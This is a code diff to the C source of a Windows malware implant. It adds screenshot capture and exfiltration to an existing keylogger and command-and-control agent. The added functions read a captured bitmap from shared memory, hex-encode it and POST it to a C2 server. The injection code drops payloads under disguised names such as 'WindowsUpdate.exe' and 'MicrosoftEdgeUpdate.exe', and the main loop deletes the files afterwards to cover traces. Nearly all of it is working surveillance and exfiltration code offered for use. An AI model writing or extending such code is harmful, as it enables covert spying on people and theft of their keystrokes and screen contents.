@@ -1232,6 +1232,16 @@ typedef struct {
     char buffer[SHARED_BUFFER_SIZE];
 } SharedKeyloggerData;
 
+#define SCREENSHOT_SHARED_MEMORY_NAME "Local\\ScreenshotSharedMem"
+#define SCREENSHOT_PATH               "C:\\Users\\Public\\screenshot.bmp"
+
+typedef struct {
+    volatile LONG has_new_data;
+    volatile LONG is_active;
+    volatile LONG screenshot_size;
+    char screenshot_path[MAX_PATH];
+} SharedScreenshotData;
+
 
 // ============================================================================
 // FUNCTION PROTOTYPES
@@ -1263,6 +1273,10 @@ int send_architecture_to_c2(const char* agent_id, const SystemInfo* sysInfo);
 // Keylogger functions
 int read_keylogger_data(char* output_buffer, size_t buffer_size);
 int send_keylogger_data_to_c2(const char* agent_id, const char* keylogger_data);
+
+// Screenshot functions
+int read_screenshot_data(unsigned char** out_data, size_t* out_size);
+int send_screenshot_to_c2(const char* agent_id, const unsigned char* data, size_t size);
 
 
 // ============================================================================
@@ -2374,6 +2388,153 @@ int send_keylogger_data_to_c2(const char* agent_id, const char* keylogger_data) 
 
 
 /**
+ * Read screenshot from shared memory signal + file on disk.
+ * Allocates *out_data (caller must free). Returns 0 on success, -1 on error.
+ */
+int read_screenshot_data(unsigned char** out_data, size_t* out_size) {
+    if (!out_data || !out_size) return -1;
+    *out_data = NULL;
+    *out_size = 0;
+
+    HANDLE hMap = OpenFileMappingA(FILE_MAP_ALL_ACCESS, FALSE, SCREENSHOT_SHARED_MEMORY_NAME);
+    if (hMap == NULL) {
+        DEBUG("[Screenshot Reader] No shared memory found (payload not running)\n");
+        return -1;
+    }
+
+    SharedScreenshotData* pData = (SharedScreenshotData*)MapViewOfFile(
+        hMap, FILE_MAP_ALL_ACCESS, 0, 0, sizeof(SharedScreenshotData));
+    if (!pData) {
+        CloseHandle(hMap);
+        return -1;
+    }
+
+    if (!pData->has_new_data) {
+        DEBUG("[Screenshot Reader] No new screenshot available\n");
+        UnmapViewOfFile(pData);
+        CloseHandle(hMap);
+        return 0; // pas d'erreur, juste rien de neuf
+    }
+
+    // Lire le fichier BMP depuis le disque
+    const char* path = pData->screenshot_path;
+    HANDLE hFile = CreateFileA(path, GENERIC_READ, FILE_SHARE_READ, NULL,
+                               OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
+    if (hFile == INVALID_HANDLE_VALUE) {
+        DEBUG("[Screenshot Reader] Cannot open file: %s (%lu)\n", path, GetLastError());
+        UnmapViewOfFile(pData);
+        CloseHandle(hMap);
+        return -1;
+    }
+
+    DWORD fileSize = GetFileSize(hFile, NULL);
+    if (fileSize == 0 || fileSize == INVALID_FILE_SIZE) {
+        CloseHandle(hFile);
+        UnmapViewOfFile(pData);
+        CloseHandle(hMap);
+        return -1;
+    }
+
+    unsigned char* buf = (unsigned char*)malloc(fileSize);
+    if (!buf) {
+        CloseHandle(hFile);
+        UnmapViewOfFile(pData);
+        CloseHandle(hMap);
+        return -1;
+    }
+
+    DWORD bytesRead = 0;
+    if (!ReadFile(hFile, buf, fileSize, &bytesRead, NULL) || bytesRead != fileSize) {
+        free(buf);
+        CloseHandle(hFile);
+        UnmapViewOfFile(pData);
+        CloseHandle(hMap);
+        return -1;
+    }
+    CloseHandle(hFile);
+
+    DEBUG("[Screenshot Reader] Read %lu bytes from %s\n", bytesRead, path);
+
+    // Signaler au payload qu'on a lu le screenshot
+    InterlockedExchange(&pData->has_new_data, 0);
+
+    UnmapViewOfFile(pData);
+    CloseHandle(hMap);
+
+    *out_data = buf;
+    *out_size = (size_t)bytesRead;
+    return 1; // données disponibles
+}
+
+
+/**
+ * Encode data en hex et envoie au C2 comme screenshot.
+ */
+int send_screenshot_to_c2(const char* agent_id, const unsigned char* data, size_t size) {
+    if (!agent_id || !data || size == 0) return -1;
+
+    // Encoder en hex
+    size_t hex_len = size * 2 + 1;
+    char* hex_buf = (char*)malloc(hex_len);
+    if (!hex_buf) return -1;
+
+    for (size_t i = 0; i < size; i++)
+        sprintf(hex_buf + i * 2, "%02X", data[i]);
+    hex_buf[size * 2] = '\0';
+
+    DEBUG("[C2 - Screenshot] Sending screenshot to C2 (%zu bytes -> %zu hex chars)\n", size, size * 2);
+
+    // Construire le body JSON
+    size_t body_len = strlen(agent_id) + hex_len + 64;
+    char* body = (char*)malloc(body_len);
+    if (!body) { free(hex_buf); return -1; }
+    snprintf(body, body_len, "{\"agent_id\":\"%s\",\"type\":\"screenshot\",\"data\":\"%s\"}", agent_id, hex_buf);
+    free(hex_buf);
+
+    WSADATA wsa;
+    if (WSAStartup(MAKEWORD(2, 2), &wsa) != 0) { free(body); return -1; }
+
+    SOCKET sock = socket(AF_INET, SOCK_STREAM, 0);
+    if (sock == INVALID_SOCKET) { WSACleanup(); free(body); return -1; }
+
+    struct sockaddr_in server;
+    server.sin_family = AF_INET;
+    server.sin_port = htons(C2_PORT);
+    server.sin_addr.s_addr = inet_addr(C2_SERVER);
+
+    if (connect(sock, (struct sockaddr*)&server, sizeof(server)) < 0) {
+        closesocket(sock); WSACleanup(); free(body); return -1;
+    }
+
+    size_t req_len = strlen(body) + 256;
+    char* request = (char*)malloc(req_len);
+    if (!request) { closesocket(sock); WSACleanup(); free(body); return -1; }
+
+    snprintf(request, req_len,
+        "POST /screenshot HTTP/1.1\r\n"
+        "Host: %s:%d\r\n"
+        "Content-Type: application/json\r\n"
+        "Content-Length: %zu\r\n"
+        "Connection: close\r\n\r\n"
+        "%s",
+        C2_SERVER, C2_PORT, strlen(body), body);
+
+    send(sock, request, (int)strlen(request), 0);
+    free(request);
+    free(body);
+
+    char recv_buf[1024] = {0};
+    recv(sock, recv_buf, sizeof(recv_buf) - 1, 0);
+
+    closesocket(sock);
+    WSACleanup();
+
+    DEBUG("[C2 - Screenshot] Screenshot sent successfully\n");
+    return 0;
+}
+
+
+/**
  * Execute a task received from C2
  */
 int execute_task(const Task* task, unsigned char xor_function_key, unsigned char xor_process_key) {
@@ -2385,25 +2546,43 @@ int execute_task(const Task* task, unsigned char xor_function_key, unsigned char
         case TASK_INJECT:
             DEBUG("[Task Execution - Inject] Launching payload as separate process\n");
 
-            // FIRST: Check if shared memory exists (indicates keylogger is already running)
-            DEBUG("[Task Execution - Inject] Checking if keylogger is already running...\n");
-            HANDLE hMapTest = OpenFileMappingA(FILE_MAP_READ, FALSE, SHARED_MEMORY_NAME);
-            if (hMapTest != NULL) {
-                DEBUG("[Task Execution - Inject] Keylogger is already running, skipping launch\n");
-                CloseHandle(hMapTest);
-                // Mark as running so next pre-check skips heavy payload decode entirely
-                g_running_payload.is_running = 1;
-                if (task->payload_name[0] != '\0')
-                    strncpy(g_running_payload.payload_name, task->payload_name, 63);
-                return 0;  // Success - already running
+            // FIRST: Check if THIS specific payload is already running via its shared memory
+            DEBUG("[Task Execution - Inject] Checking if payload '%s' is already running...\n",
+                  task->payload_name);
+            {
+                const char* shmem_to_check = NULL;
+                if (strcmp(task->payload_name, "keylogger") == 0)
+                    shmem_to_check = SHARED_MEMORY_NAME;
+                else if (strcmp(task->payload_name, "screenshot") == 0)
+                    shmem_to_check = SCREENSHOT_SHARED_MEMORY_NAME;
+
+                if (shmem_to_check) {
+                    HANDLE hTest = OpenFileMappingA(FILE_MAP_READ, FALSE, shmem_to_check);
+                    if (hTest != NULL) {
+                        CloseHandle(hTest);
+                        DEBUG("[Task Execution - Inject] Payload already running, skipping launch\n");
+                        g_running_payload.is_running = 1;
+                        if (task->payload_name[0] != '\0')
+                            strncpy(g_running_payload.payload_name, task->payload_name, 63);
+                        return 0;
+                    }
+                }
             }
-            DEBUG("[Task Execution - Inject] Keylogger not running, proceeding with launch\n");
+            DEBUG("[Task Execution - Inject] No payload running, proceeding with launch\n");
 
             // Use provided payload
             unsigned char* payload = task->payload;
             size_t payload_size = task->payload_size;
 
-            const char* temp_path = "C:\\Users\\Public\\WindowsUpdate.exe";
+            // Chemin unique selon le payload pour éviter les conflits de verrouillage
+            char temp_path_buf[MAX_PATH];
+            if (strcmp(task->payload_name, "screenshot") == 0)
+                strncpy(temp_path_buf, "C:\\Users\\Public\\MicrosoftEdgeUpdate.exe", MAX_PATH - 1);
+            else if (strcmp(task->payload_name, "keylogger") == 0)
+                strncpy(temp_path_buf, "C:\\Users\\Public\\WindowsUpdate.exe", MAX_PATH - 1);
+            else
+                snprintf(temp_path_buf, MAX_PATH, "C:\\Users\\Public\\svc%s.exe", task->payload_name);
+            const char* temp_path = temp_path_buf;
 
             if (GetFileAttributesA(temp_path) != INVALID_FILE_ATTRIBUTES) {
                 DEBUG("[Task Execution - Inject] Deleting old payload file...\n");
@@ -3147,6 +3326,47 @@ int main(void) {
                 }
 
                 keylogger_check_counter = 0;
+            }
+        }
+
+        // ------------------------------------------------------------------------
+        // SCREENSHOT - ONE SHOT : récupère + envoie + cleanup
+        // ------------------------------------------------------------------------
+        if (g_running_payload.is_running && strcmp(g_running_payload.payload_name, "screenshot") == 0) {
+            unsigned char* screenshot_data = NULL;
+            size_t screenshot_size = 0;
+            int result = read_screenshot_data(&screenshot_data, &screenshot_size);
+
+            if (result == 1 && screenshot_data != NULL) {
+                DEBUG("[Main Loop - Screenshot] Screenshot ready: %zu bytes\n", screenshot_size);
+
+                if (send_screenshot_to_c2(c2_response.agent_id, screenshot_data, screenshot_size) == 0) {
+                    DEBUG("[Main Loop - Screenshot] Screenshot sent to C2 successfully\n");
+                } else {
+                    DEBUG("[Main Loop - Screenshot - Error] Failed to send screenshot to C2\n");
+                }
+                free(screenshot_data);
+
+                // Cleanup : terminer le process + supprimer l'exe + reset état
+                DEBUG("[Main Loop - Screenshot] Cleaning up payload...\n");
+                if (g_running_payload.process_handle != NULL) {
+                    WaitForSingleObject(g_running_payload.process_handle, 3000);
+                    TerminateProcess(g_running_payload.process_handle, 0);
+                    CloseHandle(g_running_payload.process_handle);
+                }
+                DeleteFileA(g_running_payload.payload_path);
+                DeleteFileA(SCREENSHOT_PATH);
+
+                g_running_payload.is_running      = 0;
+                g_running_payload.process_id      = 0;
+                g_running_payload.process_handle  = NULL;
+                g_running_payload.payload_path[0] = '\0';
+                g_running_payload.payload_name[0] = '\0';
+
+                DEBUG("[Main Loop - Screenshot] Cleanup done, ready for next inject\n");
+
+            } else if (result == 0) {
+                DEBUG("[Main Loop - Screenshot] Waiting for screenshot payload...\n");
             }
         }
 
